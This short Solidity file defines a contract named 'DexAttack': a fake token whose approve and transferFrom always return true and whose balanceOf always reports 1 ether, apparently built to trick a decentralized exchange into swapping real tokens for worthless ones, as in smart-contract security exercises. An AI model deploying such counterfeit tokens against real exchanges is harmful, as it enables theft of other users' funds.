// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract DexAttack {
    function approve(
        address owner,
        address spender,
        uint256 amount
    ) public returns (bool) {
        return true;
    }

    function balanceOf(address token) public view returns (uint256) {
        return 1 ether;
    }

    function transferFrom(
        address sender,
        address receiver,
        uint256 amount
    ) public returns (bool) {
        return true;
    }
}
